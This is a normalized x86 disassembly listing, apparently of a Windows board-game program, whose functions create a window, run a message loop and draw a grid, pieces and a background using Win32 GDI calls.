mov eax 0x78787879
mov [ ebp - 0x30 ] edi
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
imul [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x24 ] eax
mov eax 0x78787879
imul [ ebp - 0x14 ]
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp esi ecx
jg r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
sub [ ebp - 0x18 ] esi
lea ebx [ esi + 0x1 ]
mov eax esi
shl eax 0x4
add eax esi
lea ecx [ eax * 2 + 0x1 ]
lea eax [ esi + esi * 2 ]
mov [ ebp - 0x1c ] ecx
mov esi [ ebp - 0x18 ]
lea eax [ edi + eax * 4 ]
lea edx [ eax * 4 + rw-data ]
inc esi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x18 ] esi
add edx 0x30
add ecx 0x22
inc ebx
mov [ ebp - 0x34 ] edx
sub esi 0x1
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] esi
jne r-xdata
mov eax edi
lea esi [ edi + 0x1 ]
shl eax 0x4
add eax edi
lea edi [ eax * 2 + 0x1 ]
mov eax edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x30 ]
inc edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edx
nop [ eax ] eax
cmp edi eax
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ eax * 4 + r--data ]
push [ eax * 4 + rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov ecx [ ebp - 0x1c ]
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0x20
je r-xdata
cmp [ rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push ecx
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
mov eax [ ebp - 0x28 ]
inc esi
mov ecx [ ebp - 0x1c ]
add eax 0x4
add edi 0x22
mov [ ebp - 0x28 ] eax
sub [ ebp - 0x2c ] 0x1
jne r-xdata
cmp [ eax * 8 + rw-data ] ebx
jne r-xdata
mov eax [ eax ]
cmp eax 0x20
je r-xdata
mov edi [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
mov esi [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
cmp [ eax * 8 + rw-data ] esi
jne r-xdata
push [ rw-data ]
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ DrawIcon@IAT ]
sub_405b90
push ebp
mov ebp esp
sub esp 0x354
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx 0x40
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x33c ] eax
lea edi [ ebp - 0x104 ]
lea eax [ ebp - 0x338 ]
mov [ ebp - 0x354 ] ebx
push eax
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x330 ] 0x20
push eax
lea eax [ ebp - 0x33c ]
mov [ ebp - 0x338 ] 0x0
push eax
mov esi rw-data
mov [ ebp - 0x334 ] 0x0
[ edi ] [ esi ]
lea eax [ ebp - 0x104 ]
mov ecx 0x84
push eax
lea eax [ ebp - 0x314 ]
mov esi rw-data
lea edi [ ebp - 0x314 ]
[ edi ] [ esi ]
push eax
call sub_40c040
add esp 0x14
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov eax [ ebp - 0x338 ]
mov esi [ ebp - 0x330 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x334 ]
push ebx
mov [ ebp - 0x328 ] eax
call [ GetDC@IAT ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x344 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x32c ]
push eax
lea edi [ esi * 8 + rw-data ]
push edi
push esi
push rw-data
mov [ ebp - 0x340 ] edi
call sub_406e50
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x32c ]
mov edx [ ebp - 0x328 ]
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
cmp eax 0x20
je r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x34c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x350 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x348 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov edi eax
mov [ rw-data ] eax
mov eax [ ebp - 0x340 ]
push rw-data
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
call sub_407590
xor eax eax
mov [ rw-data ] 0x20
cmp [ rw-data ] eax
sete al
mov [ rw-data ] eax
mov eax esi
shl eax 0x4
add eax esi
mov esi [ ebp - 0x344 ]
lea edx [ eax * 2 - 0x22 ]
mov eax edi
shl eax 0x4
add eax edi
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059a0
mov ecx [ ebp - 0x32c ]
shl ecx 0x4
add ecx [ ebp - 0x32c ]
lea edx [ ecx * 2 - 0x22 ]
mov ecx [ ebp - 0x328 ]
shl ecx 0x4
lea eax [ edx + 0x22 ]
add ecx [ ebp - 0x328 ]
mov [ ebp - 0x31c ] eax
mov [ ebp - 0x324 ] edx
lea ecx [ ecx * 2 - 0x22 ]
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059a0
mov eax ebx
shl eax 0x4
add eax ebx
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x348 ]
shl eax 0x4
add eax [ ebp - 0x348 ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059a0
mov eax [ ebp - 0x34c ]
shl eax 0x4
add eax [ ebp - 0x34c ]
lea edx [ eax * 2 - 0x22 ]
mov eax [ ebp - 0x350 ]
shl eax 0x4
add eax [ ebp - 0x350 ]
mov [ ebp - 0x324 ] edx
lea ecx [ eax * 2 - 0x22 ]
lea eax [ edx + 0x22 ]
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] eax
lea eax [ ecx + 0x22 ]
mov [ ebp - 0x318 ] eax
lea eax [ ebp - 0x324 ]
push eax
push esi
call sub_4059a0
mov ecx [ rw-data ]
add esp 0x2c
mov eax [ ecx * 4 + r--data ]
cmp [ eax * 8 + rw-data ] 0x0
je r-xdata
mov [ eax * 8 + rw-data ] 0x0
cmp [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ rw-data ]
mov esi [ SetCursor@IAT ]
call esi
push [ ebp - 0x354 ]
call sub_405b90
add esp 0x4
push [ rw-data ]
call esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
sub_405f00
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0xcc ]
push 0x64
push eax
push 0x6a
push [ rw-data ]
call [ LoadStringW@IAT ]
mov ecx [ ebp + 0xc ]
cmp ecx 0x111
ja r-xdata
mov eax ecx
sub eax 0x200
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
call sub_4056f0
sub eax 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
movzx eax cx
cmp eax 0x8004
jg r-xdata
mov eax ecx
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x14 ]
movzx ecx ax
shr eax 0x10
push eax
push ecx
push edi
call sub_405590
add esp 0xc
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ecx
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
cmp eax 0x8005
je r-xdata
je r-xdata
push edi
call sub_405330
add esp 0x4
xor eax eax
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
je r-xdata
call sub_4057e0
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x1
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
push eax
call sub_4059a0
jmp r-xdata
push [ ebp + 0x14 ]
push ecx
push 0x111
push edi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
call sub_4057e0
movaps xmm0 [ r--data ]
push edi
mov [ rw-data ] 0x0
movups [ ebp - 0xdc ] xmm0
call [ GetDC@IAT ]
lea ecx [ ebp - 0xdc ]
push ecx
push eax
call sub_4059a0
mov esi [ SetCursor@IAT ]
add esp 0x8
push [ rw-data ]
call esi
push edi
call sub_405b90
add esp 0x4
push [ rw-data ]
call esi
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub eax 0x68
je r-xdata
push [ rw-data ]
call [ DeleteObject@IAT ]
push [ rw-data ]
call [ DeleteDC@IAT ]
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub eax 0xd
jne r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0x8
xor ecx ebp
xor eax eax
pop edi
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
push 0x0
push sub_404f40
push edi
push 0x67
push [ rw-data ]
call [ DialogBoxParamW@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub eax 0x1
jne r-xdata
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ ebp - 0xec ]
push eax
push edi
call [ GetClientRect@IAT ]
lea eax [ ebp - 0xec ]
push eax
push esi
call sub_4059a0
add esp 0x8
lea eax [ ebp - 0x12c ]
push eax
push edi
call [ EndPaint@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
push edi
call [ DestroyWindow@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x10
sub_4061b0
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi [ LoadStringW@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push 0x64
push rw-data
push 0x67
push edi
call esi
push 0x64
push rw-data
push 0x6d
push edi
call esi
push edi
call sub_4052b0
add esp 0x4
mov [ rw-data ] edi
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xc80000
push rw-data
push rw-data
push 0x0
call [ CreateWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x10
push 0x0
push esi
call [ ShowWindow@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov esi [ GetMessageW@IAT ]
lea eax [ ebp - 0x1c ]
push 0x0
push 0x0
push 0x0
push eax
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov edi [ TranslateMessage@IAT ]
push ebx
mov ebx [ DispatchMessageW@IAT ]
nop [ eax ] eax
lea eax [ ebp - 0x1c ]
push eax
call edi
lea eax [ ebp - 0x1c ]
push eax
call ebx
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
pop ebx
sub_406290
push ebp
mov ebp esp
push 0xffffffff
push sub_44c32f
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
test eax eax
je r-xdata
cmp eax 0x8
je r-xdata
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ MoveToEx@IAT ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
shl edi 0x4
add edi [ ebp + 0x10 ]
shl esi 0x4
add edi edi
add esi eax
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add esi esi
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push ecx
call edx
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffd
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0xfffffffa
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax edi
push 0x0
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ MoveToEx@IAT ]
mov eax [ ebx * 4 + r--data ]
add eax 0x6
add eax edi
push eax
mov eax [ ebx * 4 + r--data ]
add eax 0x3
add eax esi
push eax
push [ ebp + 0x8 ]
call [ LineTo@IAT ]
push 0x1
call sub_40c344
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx eax
call sub_404e20
sub_406570
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x14
call sub_417244
mov ecx 0x14
cdq
idiv ecx
push ecx
movd xmm0 edx
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvtpd2ps xmm0 xmm0
movss [ esp ] xmm0
call sub_417244
cdq
mov ecx 0x3e8
idiv ecx
add edx 0x1f4
push edx
call sub_417244
cdq
mov ecx 0x154
idiv ecx
push edx
call sub_417244
neg eax
mov ebx [ ebp + 0xc ]
mov ecx 0x132
cdq
idiv ecx
push edx
push ebx
push 0x154
push ecx
push [ ebp + 0x8 ]
call sub_406a50
movzx edi bl
mov eax ebx
shr eax 0x8
add esp 0x24
movzx eax al
mov esi 0xff
shr ebx 0x10
mov [ ebp + 0xc ] eax
lea edx [ edi + 0x28 ]
cmp edx esi
movzx ebx bl
lea ecx [ eax + 0x28 ]
cmovg edx esi
cmp ecx esi
cmovg ecx esi
lea eax [ ebx + 0x28 ]
cmp eax esi
cmovg eax esi
movzx esi al
shl esi 0x8
movzx eax cl
xor ecx ecx
or esi eax
movzx eax dl
shl esi 0x8
or esi eax
lea eax [ edi - 0x28 ]
test eax eax
push esi
mov esi [ CreatePen@IAT ]
cmovs eax ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
add eax 0xffffffd8
cmovs eax ecx
mov [ ebp + 0xc ] eax
xor eax eax
add ebx 0xffffffd8
push eax
push eax
cmovs ebx eax
call esi
mov edi eax
mov ecx [ ebp + 0xc ]
movzx ecx cl
movzx edx bl
shl edx 0x8
or edx ecx
mov [ ebp - 0xc ] edi
mov ecx [ ebp - 0x4 ]
shl edx 0x8
movzx ecx cl
or edx ecx
push edx
push 0x0
push 0x0
call esi
mov ebx [ ebp + 0x8 ]
push edi
push ebx
mov [ ebp - 0x8 ] eax
call [ SelectObject@IAT ]
mov edi [ LineTo@IAT ]
xor esi esi
mov [ ebp - 0x4 ] eax
nop
mov eax [ esi * 4 + r--data ]
push 0x0
add eax ecx
push eax
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax [ ebp + 0xc ]
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
mov ecx [ ebp + 0xc ]
add ecx 0x22
mov [ ebp + 0xc ] ecx
cmp ecx 0x110
jle r-xdata
mov edi 0x22
nop [ eax ] eax
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x88
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xaa
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
add edi 0x22
cmp edi 0xee
jle r-xdata
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
mov edi [ LineTo@IAT ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
push esi
push 0x2
push 0x7
push ebx
call sub_406290
push esi
push 0x2
push 0x1
push ebx
call sub_406290
push esi
push 0x3
push 0x0
push ebx
call sub_406290
push esi
push 0x3
push 0x2
push ebx
call sub_406290
add esp 0x40
push esi
push 0x3
push 0x4
push ebx
call sub_406290
push esi
push 0x3
push 0x6
push ebx
call sub_406290
push esi
push 0x3
push 0x8
push ebx
call sub_406290
push esi
push 0x7
push 0x7
push ebx
call sub_406290
add esp 0x40
push esi
push 0x7
push 0x1
push ebx
call sub_406290
push esi
push 0x6
push 0x0
push ebx
call sub_406290
push esi
push 0x6
push 0x2
push ebx
call sub_406290
push esi
push 0x6
push 0x4
push ebx
call sub_406290
add esp 0x40
push esi
push 0x6
push 0x6
push ebx
call sub_406290
push esi
push 0x6
push 0x8
push ebx
call sub_406290
inc esi
add esp 0x20
cmp esi 0x1
jle r-xdata
push [ ebp + esi * 4 - 0xc ]
push ebx
call [ SelectObject@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
push 0x0
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
push [ esi * 4 + r--data ]
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call edi
mov ecx 0x22
mov [ ebp + 0xc ] ecx
push [ ebp - 0x4 ]
push ebx
call [ SelectObject@IAT ]
push [ ebp - 0xc ]
mov esi [ DeleteObject@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_406a50
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
push ebx
xor ecx ecx
push esi
push edi
mov [ esp + 0x14 ] ecx
cmp [ ebp + 0x10 ] ecx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
xorps xmm2 xmm2
inc ecx
mov [ esp + 0x14 ] ecx
cmp ecx [ ebp + 0x10 ]
jl r-xdata
movd xmm0 ecx
mov ecx [ ebp + 0x14 ]
mov bx cx
cvtdq2ps xmm0 xmm0
movzx eax cl
mov [ esp + 0x20 ] eax
mov eax ecx
shr bx 0x8
shr eax 0x10
mov [ esp + 0x12 ] bx
mulss xmm0 [ r--data ]
mov [ esp + 0x34 ] eax
movss [ esp + 0x24 ] xmm0
nop
xor edi edi
test eax eax
jle r-xdata
cvtps2pd xmm0 xmm0
movsd [ esp + 0x38 ] xmm0
fld [ esp + 0x38 ]
fldz
call sub_4293da
fstp [ esp + 0x1c ]
movss xmm0 [ esp + 0x1c ]
movss xmm0 [ r--data ]
jmp r-xdata
movss xmm0 [ esp + 0x1c ]
cvtps2pd xmm0 xmm0
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
cvtps2pd xmm0 xmm1
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
call sub_4293da
fstp [ esp + 0x28 ]
movss xmm0 [ esp + 0x28 ]
movss xmm0 [ r--data ]
jmp r-xdata
addss xmm0 [ ebp + 0x24 ]
movd xmm1 [ ebp + 0x18 ]
cvtdq2ps xmm1 xmm1
movss [ esp + 0x28 ] xmm0
addss xmm1 [ esp + 0x24 ]
cvtps2pd xmm0 xmm0
movss [ esp + 0x1c ] xmm1
call sub_4295b0
movss xmm1 [ esp + 0x18 ]
cvtps2pd xmm1 xmm1
mulsd xmm0 xmm1
movd xmm1 [ ebp + 0x1c ]
cvtdq2ps xmm1 xmm1
cvtsd2ss xmm0 xmm0
addss xmm0 xmm1
movss [ esp + 0x38 ] xmm0
movss xmm0 [ esp + 0x28 ]
cvtps2pd xmm0 xmm0
call sub_4293f0
movss xmm1 [ esp + 0x18 ]
xorps xmm2 xmm2
cvtps2pd xmm1 xmm1
mov esi [ ebp + 0x14 ]
mulsd xmm0 xmm1
movss xmm1 [ esp + 0x1c ]
mulss xmm1 xmm1
cvtsd2ss xmm2 xmm0
movd xmm0 [ ebp + 0x20 ]
cvtdq2ps xmm0 xmm0
addss xmm2 xmm0
movaps xmm0 xmm2
movss [ esp + 0x28 ] xmm2
mulss xmm0 xmm2
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_429780
movss xmm1 [ esp + 0x28 ]
cvtsd2ss xmm0 xmm0
movss [ esp + 0x18 ] xmm0
xorps xmm0 xmm0
ucomiss xmm1 xmm0
lahf
test ah 0x44
jpe r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ esp + 0x20 ]
cdq
sub eax edx
mov edx 0x0
sar eax 0x1
sub ecx eax
cmovs ecx edx
sub ebx eax
cmovs ebx edx
mov edx [ esp + 0x1c ]
sub edx eax
mov eax 0x0
cmovs edx eax
movzx esi dl
lea eax [ edx - 0x1 ]
cmp eax 0x2
ja r-xdata
movss xmm1 [ esp + 0x38 ]
divss xmm1 [ r--data ]
mov eax [ esp + 0x34 ]
movzx eax al
movzx ebx bl
mov [ esp + 0x1c ] eax
mulss xmm0 [ r--data ]
addss xmm0 xmm1
cvtps2pd xmm0 xmm0
call sub_4295b0
movss xmm1 [ esp + 0x18 ]
mov ecx 0xa
mulsd xmm0 [ r--data ]
cvtps2pd xmm1 xmm1
addsd xmm0 xmm1
cvtsd2ss xmm0 xmm0
cvttss2si eax xmm0
cdq
idiv ecx
test edx edx
je r-xdata
movd xmm1 edi
cvtdq2ps xmm1 xmm1
movaps xmm0 xmm1
mulss xmm0 xmm1
addss xmm0 xmm2
cvtps2pd xmm0 xmm0
call sub_429780
cvtsd2ss xmm0 xmm0
xorps xmm1 xmm1
movss [ esp + 0x18 ] xmm0
movd xmm0 edi
cvtdq2ps xmm0 xmm0
ucomiss xmm0 xmm1
lahf
test ah 0x44
jpe r-xdata
mov ecx [ esp + 0x14 ]
push esi
push [ esp + 0x18 ]
push edi
push [ ebp + 0x8 ]
call [ SetPixel@IAT ]
mov eax [ ebp + 0xc ]
inc edi
mov bx [ esp + 0x12 ]
xorps xmm2 xmm2
cmp edi eax
jl r-xdata
mov edx [ ebp + 0x28 ]
mov eax 0x0
mov ecx [ esp + 0x20 ]
sub ecx edx
cmovs ecx eax
sub ebx edx
cmovs ebx eax
mov eax [ esp + 0x1c ]
sub eax edx
mov edx 0x0
cmovs eax edx
movzx esi al
jmp r-xdata
shl esi 0x8
movzx eax bl
or esi eax
movzx eax cl
shl esi 0x8
or esi eax
sub_406d10
push ebp
mov ebp esp
and esp 0xfffffff8
